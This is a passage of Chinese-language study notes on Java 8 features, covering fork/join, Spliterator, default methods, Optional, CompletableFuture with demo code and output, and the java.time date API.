computeSequentially() {\n        long sum = 0;\n        for (int i = start; i < end; i++) {\n            sum += numbers[i];\n        }\n        return sum;\n    }\n\n    // 如何调用fork/join框架\n    public static long forkJoinSum(long n) {\n        long[] numbers = LongStream.rangeClosed(1, n).toArray();\n        ForkJoinTask<Long> task = new ForkJoinSumCalculator(numbers);\n        return new ForkJoinPool().invoke(task);\n    }\n}\n```\n\n### 好的做法\n\n+ join方法会阻塞，所以先确保两个子任务全部启动，再调用join\n+ `RecursiveTask`内部不应该调用ForkJoinPool.invoke，应该直接调用compute、fork，只有顺序代码才应该用 invoke 来启动并行计算\n+ 一边子任务fork，一边子任务compute，避免在线程池中多分配一个任务造成的开销\n+ 调试使用分支/合并框架的并行计算可能有点棘手, 调用compute的线程并不是概念上的调用方(即调用fork的那个).\n+ 不应理所当然地认为在多核处理器上使用分支/合并框架就比顺序计算快。\n\n**工作窃取（work stealing）**\n目的：为解决因为每个子任务所花的时间可能天差地别而造成的效率低下。 过程：线程把任务保存到一个双向链式队列，当一个线程的队列空了，它就随机从其他线程的队列尾部“偷”一个任务执行\n\n###  思考\n\n问：都是拆分任务，并行执行，为什么不使用线程池，如ThreadPoolExecutor呢？\n\n答：Thread pool 默认期望它们所有执行的任务都是不相关的，可以尽可能的并行执行。\n而fork join框架解决的问题，是一个全局问题，所有子任务拆分运行后的结果，是要合并起来的。另外，`fork-join pool`另一个特点`work stealing`，如果用ThreadPoolExecutor实现是比较麻烦的\n\n## 3. Spliterator分割流\n\n### 简单了解\n\n描述：一种自动机制来拆分流。新的接口“可分迭代器”（splitable iterator）\n\n```java\npublic interface Spliterator<T> {\n    boolean tryAdvance(Consumer<? super T> action);\n    Spliterator<T> trySplit();\n    long estimateSize();\n    int characteristics();\n}\n```\n\n### 拆分过程\n\n递归过程。框架不断对Spliterator调用trySplit直到它返回null,表明它处理的数据结构不能再分割。\n\n### Spliterator 的特性\n\n|  **特性**  |                           **含义**                           |\n| :--------: | :----------------------------------------------------------: |\n|  ORDERED   | 元素有既定的顺序(例如 List ),因此 Spliterator 在遍历和划分时也会遵循这一顺序 |\n|  DISTINCT  |   对于任意一对遍历过的元素 x 和 y , x.equals(y) 返回 false   |\n|   SORTED   |              遍历的元素按照一个预定义的顺序排序              |\n|   SIZED    | 该 Spliterator 由一个已知大小的源建立(例如 Set ),因此 estimatedSize() 返回的是准确值 |\n|  NONNULL   |                  保证遍历的元素不会为 null                   |\n|  IMMUTABL  | Spliterator 的数据源不能修改。这意味着在遍历时不能添加、删除或修改任何元素E |\n| CONCURRENT |   该 Spliterator 的数据源可以被其他线程同时修改而无需同步    |\n|  SUBSIZED  |  该 Spliterator 和所有从它拆分出来的 Spliterator 都是 SIZED  |\n\n### 各个函数及作用\n\n|     函数名      |                             作用                             |\n| :-------------: | :----------------------------------------------------------: |\n|   tryAdvance    | 执行一个操作给传入的元素，并且返回一个boolean，来表示是否有剩余元素需要处理 |\n|    trySplit     | 最重要的函数，如果数据可以继续分割，返回一个Spliterator，否则返回null |\n|  estimateSize   |                 返回一个对剩余元素数量的估值                 |\n| characteristics |            设置Spliterator的某些特性，参考上表。             |\n\n# 默认方法\n\n```java\n    public interface Sized {\n        int size();\n\n        default boolean isEmpty() {\n            return size() == 0;\n        }\n    }\n```\n\n这样任何一个实现了Sized接口的类都会自动继承isEmpty的实现。因此，向提供了默认实 现的接口添加方法就不是源码兼容的。\n\n☀️ 关于继承的一些错误观点\n\n  继承不应该成为你一谈到代码复用就试图倚靠的万精油。比如，从一个拥有100个方法及 字段的类进行\n继承就不是个好主意，因为这其实会引入不必要的复杂性。你完全可以使用代理 有效地规避这种窘境，即创建一个方法通过该类的成员变量直接调用该类的方法。这就是为什 么有的时候我们发现有些类被刻意地声明为final类型：**声明为final的类不能被其他的类继 承**，避免发生这样的反模式，防止核心代码的功能被污染。注意，有的时候声明为final的类 都会有其不同的原因，比如，String类被声明为final，因为我们不希望有人对这样的核心 功能产生干扰。 \n\n  这种思想同样也适用于使用默认方法的接口。通过精简的接口，你能获得最有效的组合， 因为你可以只选择你需要的实现。\n\n##  多来源继承调用默认方法原则\n\n(1) 类中的方法优先级最高。类或父类中声明的方法的优先级高于任何声明为默认方法的优 先级。 \n(2) 如果无法依据第一条进行判断，那么子接口的优先级更高：函数签名相同时，优先选择 拥有最具体实现的默认方法的接口，即如果B继承了A，那么B就比A更加具体。\n(3) 最后，如果还是无法判断，继承了多个接口的类必须通过显式覆盖和调用期望的方法，显式地选择使用哪一个默认方法的实现。\n\n# 用Optional取代null\n\n## 创建 Optional 对象\n\n1. 声明一个空的Optional\n\n```java\nOptional<Car> optCar = Optional.empty();\n```\n\n2. 依据一个非空值创建Optional\n\n```java\nOptional<Car> optCar = Optional.of(car);\n```\n\n3. 可接受null的Optional\n   最后，使用静态工厂方法Optional.ofNullable，你可以创建一个允许null值的Optional 对象：\n\n```java\nOptional<Car> optCar = Optional.ofNullable(car);\n```\n\n## 使用 map 从 Optional 对象中提取和转换值\n\n```java\nOptional<Insurance> optInsurance = Optional.ofNullable(insurance);\nOptional<String> name = optInsurance.map(Insurance::getName);\n```\n\n## 使用 flatMap 链接 Optional 对象\n\n### 原因\n\n使用 map 从 Optional 对象中提取和转换值，遭遇嵌套式的Optional结构\n\n```java\nOptional<Person> optPerson = Optional.of(person); \nOptional<String> name = optPerson.map(Person::getCar) .map(Car::getInsurance) .map(Insurance::getName);\n```\n\n### 处理\n\n```java\npublic String getCarInsuranceName(Optional<Person> person) { \n\treturn person.flatMap(Person::getCar)\n                          .flatMap(Car::getInsurance)\n                          .map(Insurance::getName)\n                          .orElse(\"Unknown\"); \n}\n```\n\n## Optional类并未实现 Serializable接口\n\n## 默认行为及解引用 Optional 对象\n\n|    方法     |                             描述                             |\n| :---------: | :----------------------------------------------------------: |\n|    empty    |                  返回一个空的 Optional 实例                  |\n|   filter    | 如果值存在并且满足提供的谓词，就返回包含该值的 Optional 对象；否则返回一个空的 Optional 对象 |\n|   flatMap   | 如果值存在，就对该值执行提供的 mapping 函数调用，返回一个 Optional 类型的值，否则就返 回一个空的 Optional对象 |\n|     get     | 如果该值存在，将该值用 Optional 封装返回，否则抛出一个 NoSuchElementException 异常 |\n|  ifPresent  |     如果值存在，就执行使用该值的方法调用，否则什么也不做     |\n|  isPresent  |            如果值存在就返回 true，否则返回 false             |\n|     map     |       如果值存在，就对该值执行提供的 mapping 函数调用        |\n|     of      | 将指定值用 Optional 封装之后返回，如果该值为 null，则抛出一个 NullPointerException 异常 |\n| ofNullable  | 将指定值用 Optional 封装之后返回，如果该值为 null，则返回一个空的 Optional 对象 |\n|   orElse    |            如果有值则将其返回，否则返回一个默认值            |\n|  orElseGet  | 如果有值则将其返回，否则返回一个由指定的 Supplier 接口生成的值 |\n| orElseThrow | 如果有值则将其返回，否则抛出一个由指定的 Supplier 接口生成的异常 |\n\n# CompletableFuture 组合式异步编程\n\n## Future 接口异步\n\nFuture接口在Java 5中被引入，设计初衷是对将来某个时刻会发生的结果进行建模。它建模 了一种异步计算，返回一个执行运算结果的引用，当运算结束后，这个引用被返回给调用方。\n\n### 模拟1\n\n+ 使用Future以异步的方式执行一个耗时的操作\n\n```java\nimport org.junit.Test;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic class FutureInAction {\n\n    private interface Future<T> {\n\n        T get();\n\n        boolean isDone();\n    }\n\n    private interface Callable<T> {\n        T action();\n    }\n\n    private static <T> Future<T> invoke(Callable<T> callable) {\n\n        // 异步返回值\n        AtomicReference<T> result = new AtomicReference<>();\n        // 异步处理完成\n        AtomicBoolean finished = new AtomicBoolean(false);\n        Thread thread = new Thread(() -> {\n            result.set(callable.action());\n            finished.set(true);\n        });\n        thread.start();\n        Future<T> future = new Future<T>() {\n            @Override\n            public T get() {\n                return result.get();\n            }\n\n            @Override\n            public boolean isDone() {\n                return finished.get();\n            }\n        };\n        return future;\n    }\n\n    @Test\n    public void testFuture() {\n        Future<String> result = invoke(() -> {\n            try {\n                Thread.sleep(10);\n                return \"I am finished.\";\n            } catch (InterruptedException e) {\n                return \"Error\";\n            }\n        });\n\n        System.out.println(result.get());\n        while (!result.isDone()) {\n            try {\n                Thread.sleep(1);\n                System.out.println(\"waitting...\");\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n        System.out.println(result.get());\n        System.out.println(result.isDone());\n    }\n}\n```\n\n输出\n\n```\nnull\nwaitting...\nwaitting...\nwaitting...\nwaitting...\nwaitting...\nwaitting...\nI am finished.\ntrue\n```\n\n### 模拟2\n\n```java\nimport org.junit.Test;\n\nimport java.util.concurrent.*;\nimport java.util.concurrent.atomic.LongAccumulator;\n\npublic class FutureInAction2 {\n\n    @Test\n    public void testExecutorService() {\n        ExecutorService executorService = Executors.newSingleThreadExecutor();\n        LongAccumulator longAccumulator = new LongAccumulator(Long::sum, 0);\n        Future<String> result = executorService.submit(() -> {\n            System.out.println(Thread.currentThread().getName());\n            int begin = 1;\n            while (begin < 10) {\n                System.out.println(\"+\");\n                Thread.sleep(1);\n                longAccumulator.accumulate(begin++);\n            }\n            return \"I am finished.\";\n        });\n\n//        // 阻塞等待执行结果\n//        result.get();\n//        System.out.println(\"result...\" + longAccumulator.get());\n\n//        //最多等待10秒, 超时未执行完成，报错\n//        try {\n//            result.get(10, TimeUnit.SECONDS);\n//            System.out.println(\"result...\" + longAccumulator.get());\n//        } catch (Exception e) {\n//            // java.util.concurrent.TimeoutException\n//            e.printStackTrace();\n//        }\n\n        // 阻塞等待执行结果\n        if (!result.isDone()) {\n            System.out.print(\"running\");\n            while (!result.isDone()) {\n                System.out.print(\".\");\n            }\n            System.out.println();\n            System.out.println(\"result...\" + longAccumulator.get());\n        }\n\n        executorService.shutdown();\n    }\n}\n```\n\n输出\n\n```\nrunning.................................................................................................pool-1-thread-1\n...................................................+\n...................................................................................................+\n................................................................................................................................................................................................................................................+\n..................................................................................................................................................................+\n.........................................................................................................+\n..............................................................................................................................................................................................................+\n..........................................................................................................................................................+\n.......................................................................................................................................................+\n...............................+\n....................................................................................................................................................................................................\nresult...45\n```\n\n### 模拟3\n\n将阻塞等待完成后调用程序\n\n```java\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic class FutureInAction3 {\n    private interface Callable<T> {\n        T action();\n    }\n\n    private interface Completable<T> {\n\n        void complete(T t);\n\n        void exception(Throwable throwable);\n    }\n\n    private interface Future<T> {\n\n        T get();\n\n        boolean isDone();\n\n        void setCompletable(Completable<T> completable);\n\n        Completable<T> getCompletable();\n    }\n\n    public static <T> Future<T> invoke(Callable<T> callable) {\n\n\n        AtomicReference<T> atomicReference = new AtomicReference<>();\n        AtomicBoolean atomicBoolean = new AtomicBoolean(false);\n\n\n        Future<T> future = new Future<T>() {\n            private Completable<T> completable;\n\n            @Override\n            public T get() {\n                return atomicReference.get();\n            }\n\n            @Override\n            public boolean isDone() {\n                return atomicBoolean.get();\n            }\n\n            @Override\n            public void setCompletable(Completable<T> completable) {\n                this.completable = completable;\n            }\n\n            @Override\n            public Completable<T> getCompletable() {\n                return completable;\n            }\n        };\n\n\n        Thread thread = new Thread(() -> {\n            try {\n                T t = callable.action();\n                atomicReference.set(t);\n                atomicBoolean.set(true);\n                if (future.getCompletable() != null) {\n                    future.getCompletable().complete(t);\n                }\n            } catch (Throwable e) {\n                if (future.getCompletable() != null) {\n                    future.getCompletable().exception(e);\n                }\n            }\n        });\n        thread.start();\n\n        return future;\n    }\n\n\n    public static void main(String[] args) {\n        Future<String> result = invoke(() -> {\n            try {\n                Thread.sleep(10000);\n                return \"I am finished.\";\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n                return \"Error.\";\n            }\n        });\n\n\n        result.setCompletable(new Completable<String>() {\n            @Override\n            public void complete(String s) {\n                System.out.println(\"complete...\" + s);\n            }\n\n            @Override\n            public void exception(Throwable cause) {\n                System.out.println(\"exception error\");\n                cause.printStackTrace();\n            }\n        });\n\n        System.out.println(\"end....\");\n    }\n}\n```\n\n输出\n\n```\nend....\ncomplete...I am finished.\n```\n\n## CompletableFuture 构建异步应用\n\n### 模拟异步操作内容\n\n```java\nimport java.util.Random;\n\npublic class CompletableFutureSupport {\n\n    static final Random random = new Random(System.currentTimeMillis());\n\n    static double getActionBody() {\n        try {\n            System.out.println(Thread.currentThread().getName() + \"：get（begin）\");\n            Thread.sleep(10000L);\n            double v = random.nextDouble();\n            System.out.println(Thread.currentThread().getName() + \"：get（done）：\" + v);\n            return v;\n        } catch (InterruptedException e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n}\n```\n\n### 模拟1 \n\nCompletableFuture阻塞等待\n\n```java\nimport java.util.Optional;\nimport java.util.concurrent.CompletableFuture;\n\npublic class CompletableFutureInAction1 {\n    public static void main(String[] args) {\n        CompletableFuture<Double> completableFuture = new CompletableFuture<>();\n        new Thread(() -> {\n            System.out.println(\"action:->\" + Thread.currentThread().getName());\n            double v = CompletableFutureSupport.getActionBody();\n            completableFuture.complete(v);\n        }).start();\n\n        System.out.println(\"main.....1\");\n\n        completableFuture.whenComplete((v, t) -> {\n            System.out.println(\"complete.....2\");\n            Optional.ofNullable(v).ifPresent(System.out::println);\n            Optional.ofNullable(t).ifPresent(tt -> tt.printStackTrace());\n        });\n    }\n}\n```\n\n输出\n\n```\nmain.....1\naction:->Thread-0\nThread-0：get（begin）\nThread-0：get（done）：0.30457757812323727\ncomplete.....2\n0.30457757812323727\n```\n\n### 模拟2 \n\nCompletableFuture.supplyAsync 异步请求\n\n```java\n/**\n     * main 线程不会等待whenComplete。\n     * main结束的时候，completableFuture的Supplier 未执行完成，线程也会随main的结束而结束\n     *\n     * @throws ExecutionException\n     * @throws InterruptedException\n     */\n    public static void main(String[] args) {\n        CompletableFuture<Double> completableFuture = CompletableFuture.supplyAsync(CompletableFutureSupport::getActionBody);\n\n        System.out.println(Thread.currentThread().getName() + \"..........................1\");\n\n        completableFuture.whenComplete((v, t) -> {\n            System.out.println(Thread.currentThread().getName() + \"：complete_action（begin）\");\n            Optional.ofNullable(v).ifPresent(System.out::println);\n            Optional.ofNullable(t).ifPresent(tt -> tt.printStackTrace());\n            System.out.println(Thread.currentThread().getName() + \"：complete_action（end）\");\n        });\n    }\n```\n\n输出\n\n```java\nmain..........................1\nForkJoinPool.commonPool-worker-9：get（begin）\n```\n\n### 模拟3\n\n改写模拟2，不使用阻塞的方式\n\n```java\npublic static void main(String[] args) {\n        ExecutorService executorService = Executors.newFixedThreadPool(2, (r) -> {\n            Thread thread = new Thread(r);\n            // 不以守护进程的方式运行\n            thread.setDaemon(false);\n            return thread;\n        });\n        CompletableFuture<Double> completableFuture = CompletableFuture.supplyAsync(CompletableFutureSupport::getActionBody, executorService);\n\n        // main\n        System.out.println(Thread.currentThread().getName() + \"..........................1\");\n\n\n        completableFuture.whenComplete((v, t) -> {\n            System.out.println(Thread.currentThread().getName() + \"：complete_action（begin）\");\n            Optional.ofNullable(v).ifPresent(System.out::println);\n            Optional.ofNullable(t).ifPresent(tt -> tt.printStackTrace());\n            System.out.println(Thread.currentThread().getName() + \"：complete_action（end）\");\n        });\n\n        // main\n        System.out.println(Thread.currentThread().getName() + \"..........................2\");\n\n        // 需要显示关闭线程\n        // 执行先前提交的任务后，启动有序关闭。如果已经关闭，调用没有额外的影响\n        executorService.shutdown();\n\n        // main\n        System.out.println(Thread.currentThread().getName() + \"..........................3\");\n    }\n```\n\n输出\n\n```\nmain..........................1\nThread-0：get（begin）\nmain..........................2\nmain..........................3\nThread-0：get（done）：0.9293436815770424\nThread-0：complete_action（begin）\n0.9293436815770424\nThread-0：complete_action（end）\n```\n\n## CompletableFuture常用API\n\n| 方法               | API                                                          |\n| ------------------ | ------------------------------------------------------------ |\n| supplyAsyn         | CompletableFuture<U>supplyAsync(Supplier<U>supplier);<br>CompletableFuture<U>supplyAsync(Supplier<U>supplier,Executorexecutor); |\n| then**Apply**      | CompletableFuture<U>thenApply(**Function**<?superT,?extendsU>fn); |\n| **handle**         | CompletableFuture<U>handle(**BiFunction**<?superT,Throwable,?extendsU>fn) |\n| then**Run**        | CompletableFuture<Void>thenRun(**Runnable**action)           |\n| then**Accept**     | CompletableFuture<Void>thenAccept(**Consumer**<?superT>action) |\n| thenCompose        | CompletableFuture<U>thenCompose(Function<?superT,?extendsCompletionStage<U>>fn)<br>继续执行下一个CompletableFuture |\n| then**Combine**    | CompletableFuture<V>thenCombine(CompletionStage<?extendsU>other,**BiFunction**<?superT,?superU,?extendsV>fn)<br/>两个CompletableFuture的返回结果经过**BiFunction**处理，进入后续操作。 |\n| then**Accept**Both | CompletionStage<Void>thenAcceptBoth(CompletionStage<?extendsU>other,BiConsumer<?superT,?superU>action)<br/>两个CompletableFuture的返回结果经过**BiConsumer**处理，进入后续操作。 |\n| **run**AfterBoth   | CompletableFuture<Void>runAfterBoth(CompletionStage<?>other,**Runnable**action)<br>两个CompletableFuture的返回结果经过**Runnable**处理，进入后续操作。 |\n| **apply**ToEither  | CompletionStage<U>applyToEither(CompletionStage<?extendsT>other,**Function**<?superT,U>fn)<br/>两个CompletionStage任意一个执行完成即可执行其**Function**。 |\n| **accept**Either   | CompletableFuture<Void>acceptEither(CompletionStage<?extendsT>other,**Consumer**<?superT>action)<br/>两个CompletionStage任意一个执行完成即可执行其**Consumer** |\n| **run**AfterEither | CompletableFuture<Void>runAfterEither(CompletionStage<?>other,Runnableaction)<br/>两个CompletableFuture任意一个执行完成即可执行其**Runnable** |\n| **allOf**          | public**static**CompletableFuture<Void>allOf(CompletableFuture<?>...cfs)<br/>等待所有CompletableFuture执行完成之后，执行后续操作。 |\n| **anyOf**          | publicstaticCompletableFuture<Object>anyOf(CompletableFuture<?>...cfs)<br/>等待任意一个CompletableFuture执行完成之后，执行后续操作 |\n\n### supplyAsyn\n\n```java\nAPI：\nCompletableFuture<U> supplyAsync(Supplier<U> supplier);\n举例：\nCompletableFuture.supplyAsync(() -> 1);\n\nAPI：\nCompletableFuture<U> supplyAsync(Supplier<U> supplier,  Executor executor);\n举例：\nExecutorService executor = Executors.newFixedThreadPool(2, (r) -> {\n\tThread thread = new Thread(r); \n\tthread.setDaemon(false);\n\treturn thread;\n});\nCompletableFuture.supplyAsync(() -> 1, executor);\n```\n\n### thenApply \n\n```java\nAPI:\nCompletableFuture<U> thenApply(Function<? super T,? extends U> fn);\n\n举例：\nCompletableFuture.supplyAsync(() -> 1)\n        .thenApply(v -> Integer.sum(v, 10))\n        .whenComplete((v, t) -> System.out.println(v));\n```\n\n### handle\n\n可以对抛出的异常进行处理\n\n```java\nAPI:\nCompletableFuture<U> handle(BiFunction<? super T, Throwable, ? extends U> fn)\n\n举例：\nCompletableFuture.supplyAsync(() -> 1)\n        .handle((v, t) -> Integer.sum(v, 10))\n        .whenComplete((v, t) -> System.out.println(v));\n```\n\n### thenRun\n\n执行完成之后的其他操作。无入参。\n\n```java\nAPI:\nCompletableFuture<Void> thenRun(Runnable action)\n\n举例：\nCompletableFuture.supplyAsync(() -> 1)\n        .whenComplete((v, t) -> System.out.println(v))\n        .thenRun(() -> System.out.println());\n```\n\n### thenAccept\n\n返回结果V的后续消费\n\n```java\nAPI:\nCompletableFuture<Void> thenAccept(Consumer<? super T> action)\n\n举例：\nCompletableFuture.supplyAsync(() -> 1)\n        .whenComplete((v, t) -> System.out.println(v))\n        .thenAccept((v) -> System.out.println(v));\n```\n\n### thenCompose\n\n继续执行下一个CompletableFuture\n\n```java\nAPI:\nCompletableFuture<U> thenCompose(Function<? super T, ? extends CompletionStage<U>> fn)\n\n其中：Function<? super T, ? extends CompletionStage<U>> fn是另外一个CompletableFuture。\n\n举例：\nCompletableFuture.supplyAsync(() -> 1)\n        .thenCompose(v -> CompletableFuture.supplyAsync(() -> v + 10))\n        .whenComplete((v, t) -> System.out.println(v));\n```\n\n### thenCombine\n\n两个CompletableFuture的返回结果经过BiFunction处理，进入后续操作。\n\n```java\nAPI:\nCompletableFuture<V> thenCombine(CompletionStage<? extends U> other,\n        BiFunction<? super T,? super U,? extends V> fn) \n\n举例：\nCompletableFuture.supplyAsync(() -> 1)\n        .thenCombine(CompletableFuture.supplyAsync(() -> 2), (v1, v2) -> v1 + v2)\n        .whenComplete((v, t) -> System.out.println(v));\n```\n\n### thenAcceptBoth\n\n两个CompletableFuture的返回结果经过BiConsumer处理，进入后续消费。\n\n```java\nAPI:\nCompletionStage<Void> thenAcceptBoth(CompletionStage<? extends U> other,\n        BiConsumer<? super T, ? super U> action) \n\n举例：\nCompletableFuture.supplyAsync(() -> 1)\n        .thenAcceptBoth(CompletableFuture.supplyAsync(() -> 2), (v1, v2) -> {\n            System.out.println(v1);\n            System.out.println(v2);\n        }).whenComplete((v, t) -> System.out.println(v));\n\n输出：\n1\n2\nnull\n```\n\n### runAfterBoth\n\n```java\nAPI:\nCompletableFuture<Void> runAfterBoth(CompletionStage<?> other, Runnable action)\n```\n\n### applyToEither\n\n两个CompletionStage 任意一个执行完成即可执行其Function。\n\n```java\nAPI:\nCompletionStage<U> applyToEither(CompletionStage<? extends T> other,\n         Function<? super T, U> fn)\n\n举例：\nCompletableFuture.supplyAsync(() -> 1)\n        .applyToEither(CompletableFuture.supplyAsync(() -> 2), v -> v + 10)\n        .whenComplete((v, t) -> System.out.println(v));\n输出：\n11\n```\n\n### acceptEither\n\n两个CompletionStage 任意一个执行完成即可执行其Consumer\n\n```java\nAPI:\nCompletableFuture<Void> acceptEither(\n        CompletionStage<? extends T> other, Consumer<? super T> action)\n\n举例：\nCompletableFuture.supplyAsync(() -> 1)\n        .acceptEither(CompletableFuture.supplyAsync(() -> 2), v -> System.out.println(v))\n        .whenComplete((v, t) -> System.out.println(v));\n输出：\n1\nnull\n```\n\n### runAfterEither\n\n两个CompletionStage 任意一个执行完成即可执行其Runnable。\n\n```java\nCompletableFuture<Void> runAfterEither(CompletionStage<?> other,\n                                                  Runnable action)\n```\n\n### allOf\n\n等待所有CompletableFuture执行完成之后，执行后续的操作\n\n```java\nAPI:\npublic static CompletableFuture<Void> allOf(CompletableFuture<?>... cfs)\n\n举例：\nList<CompletableFuture<Double>> collect = Arrays.asList(1, 2, 3, 4)\n    .stream()\n    .map(i -> CompletableFuture.supplyAsync(() -> 1)\n    .collect(toList());\n\nCompletableFuture.allOf(collect.toArray(new CompletableFuture[collect.size()]))\n    .thenRun(() -> System.out.println(\"done\"));\n```\n\n### anyOf\n\n等待任意一个CompletableFuture执行完成之后，执行后续的操作\n\n```java\nAPI：\npublic static CompletableFuture<Object> anyOf(CompletableFuture<?>... cfs)\n\n举例：\nList<CompletableFuture<Double>> collect = Arrays.asList(1, 2, 3, 4)\n    .stream()\n    .map(i -> CompletableFuture.supplyAsync(() -> 1)\n    .collect(toList());\n\nCompletableFuture.anyOf(collect.toArray(new CompletableFuture[collect.size()]))\n    .thenRun(() -> System.out.println(\"done\"));\n```\n\n# 新的日期和时间API\n\n## 重新设计原因\n\n1. java.util.Date 不够直观。\n   Date date = new Date(114, 2, 18);\n   它的打印输出效果为： Tue Mar 18 00:00:00 CET 2014\n1. 线程不安全\n\n```java\npublic static void main(String[] args) throws ParseException, InterruptedException {\n        SimpleDateFormat sdf = new SimpleDateFormat(\"yyyyMMdd\");\n        for (int i = 0; i < 30; i++) {\n            new Thread(() -> {\n                for (int x = 0; x < 100; x++) {\n                    Date parseDate = null;\n                    try {\n                        parseDate = sdf.parse(\"20160505\");\n                    } catch (ParseException e) {\n                        e.printStackTrace();\n                    }\n                    System.out.println(parseDate);\n                }\n            }).start();\n        }\n    }\n\n输出\nThu May 05 00:00:00 CST 2016\nThu May 05 00:00:00 CST 2016\n...\nException in thread \"Thread-19\" java.lang.NumberFormatException: For input string: \"\"\n\tat java.base/java.lang.NumberFormatException.forInputString(NumberFormatException.java:65)\n\tat java.base/java.lang.Long.parseLong(Long.java:702)\n\tat java.base/java.lang.Long.parseLong(Long.java:817)\n\tat java.base/java.text.DigitList.getLong(DigitList.java:195)\n\tat java.base/java.text.DecimalFormat.parse(DecimalFormat.java:2093)\n\tat java.base/java.text.SimpleDateFormat.subParse(SimpleDateFormat.java:1913)\n\tat java.base/java.text.SimpleDateFormat.parse(SimpleDateFormat.java:1529)\n\tat java.base/java.text.DateFormat.parse(DateFormat.java:386)\n\tat com.hots.TimeTest.lambda$main$0(TimeTest.java:15)\n\tat java.base/java.lang.Thread.run(Thread.java:844)\nException in thread \"Thread-17\" java.lang.NumberFormatException: For input string: \"\"\n\tat java.base/java.lang.NumberFormatException.forInputString(NumberFormatException.java:65)\n\tat java.base/java.lang.Long.parseLong(Long.java:702)\n\tat java.base/java.lang.Long.parseLong(Long.java:817)\n\tat java.base/java.text.DigitList.getLong(DigitList.java:195)\n\tat java.base/java.text.DecimalFormat.parse(DecimalFormat.java:2093)\n\tat java.base/java.text.SimpleDateFormat.subParse(SimpleDateFormat.java:1913)\n\tat java.base/java.text.SimpleDateFormat.parse(SimpleDateFormat.java:1529)\n\tat java.base/java.text.DateFormat.parse(DateFormat.java:386)\n\tat com.hots.TimeTest.lambda$main$0(TimeTest.java:15)\n\tat java.base/java.lang.Thread.run(Thread.java:844)\nThu May 05 00:00:00 CST 2016\n```\n\n## java.time.LocalDate  此类是不可吧变更且线程安全的。并且和时间概念区分开。\n\n```java\nLocalDate localDate = LocalDate.of(2019,1,7);\nSystem.out.println(localDate.getMonth());\nSystem.out.println(localDate.getMonthValue());\nSystem.out.println(localDate.lengthOfMonth());\n```\n\n| 方法                                         | 说明                                   |\n| -------------------------------------------- | -------------------------------------- |\n| LocalDate.now()                              | 获取当前日期                           |\n| LocalDate.of(intyear,intmonth,intdayOfMonth) | 根据参数设置日期，参数分别为年，月，日 |\n| localDate.getDayOfMonth()                    | 获取当前日期是所在月的第几天           |\n| localDate.getDayOfWeek()                     | 获取当前日期是星期几（星期的英文全称） |\n| localDate.getDayOfYear()                     | 获取当前日期是所在年的第几天           |\n| localDate.getMonth()                         | 获取当前日期所在月份（月份的英文全称） |\n| localDate.getMonthValue()                    | 获取当前日期所在月份的数值             |\n| localDate.lengthOfMonth()                    | 获取当前日期所在月份有多少天           |\n| localDate.lengthOfYear()                     | 获取当前日期所在年有多少天             |\n| localDate.**isLeapYear**()                   | 获取当前日期所在年是否是闰年           |\n| localDate.**with**DayOfMonth(intdayOfMonth)  | 将参数中的\"日\"替换localDate中的\"日\"    |\n| localDate.**with**DayOfYear(intdayOfYear)    | 将参数中的天数替换localDate中的天数    |\n| localDate.**with**Month(intmonth)            | 将参数中的\"月\"替换localDate中的\"月\"    |\n| localDate.**with**Year(intyear)              | 将参数中的\"年\"替换localDate中的\"年\"    |\n| localDate.minusDays(longdays)                | 将当前日期减一天                       |\n| localDate.minusWeeks(longweeks)              | 将当前日期减一周                       |\n| localDate.minusMonths(longmonths)            | 将当前日期减一月                       |\n| localDate.minusYears(longyears)              | 将当前日期减一年                       |\n| localDate.plusDays(longdays)                 | 将当前日期加一天                       |\n\n## java.time.LocalTime\n\n| 方法                                      | 说明                                    |\n| ----------------------------------------- | --------------------------------------- |\n| LocalTime.now()                           | 获取当前时间                            |\n| LocalTime.of(inthour,intminute)           | 根据参数设置时间，参数分别为时，分      |\n| LocalTime.of(inthour,intminute,intsecond) | 根据参数设置时间，参数分别为时，分，秒  |\n| localTime.getHour()                       | 获取当前时间的小时数                    |\n| localTime.getMinute()                     | 获取当前时间的分钟数                    |\n| localTime.getSecond()                     | 获取当前时间的秒数                      |\n| localTime.withHour(inthour)               | 将参数中的\"小时\"替换localTime中的\"小时\" |\n| localTime.withMinute(intminute)           | 将参数中的\"分钟\"替换localTime中的\"分钟\" |\n| localTime.withSecond(intsecond)           | 将参数中的\"秒\"替换localTime中的\"秒\"     |\n| localTime.minusHours(longhours)           | 将当前时间减一小时                      |\n| localTime.minusMinutes(longminutes)       | 将当前时间减一分钟                      |\n| localTime.minusSeconds(longseconds)       | 将当前时间减一秒                        |\n| localTime.plusHours(longhours)            | 将当前时间加一小时                      |\n| localTime.plusMinutes(longminutes)        | 将当前时间加一分钟                      |\n| localTime.plusSeconds(longseconds)        | 将当前时间加一秒                        |\n\n## java.time.LocalDateTime\n\n```java\nLocalDate localDate = LocalDate.now();\nLocalTime time = LocalTime.now();\n\nLocalDateTime localDateTime = LocalDateTime.of(localDate, time);\nSystem.out.println(localDateTime.toString());\nLocalDateTime now = LocalDateTime.now();\nSystem.out.println(now);\n```\n\n## java.time.Instant 机器时间\n\n```java\nInstant start = Instant.now();\nThread.sleep(1000L);\nInstant end = Instant.now();\nDuration duration = Duration.between(start, end);\nSystem.out.println(duration.toMillis());\nSystem.out.println(duration.toNanos());\n```\n\n## java.time.Duration\n\n```java\nLocalTime time = LocalTime.now();\nLocalTime beforeTime = time.minusHours(1);\nDuration duration = Duration.between(time, beforeTime);\nSystem.out.println(duration.toHours());\n```\n\n## java.time.Period \n\n```java\nPeriod period = Period.between(LocalDate.of(2014, 1, 10), LocalDate.of(2016, 1, 10));\nSystem.out.println(period.getMonths());\nSystem.out.println(period.getDays());\nSystem.out.println(period.getYears());\n```\n\n## java.time.temporal.TemporalAdjusters 时间调节器\n\n```java\nLocalDateTime now = 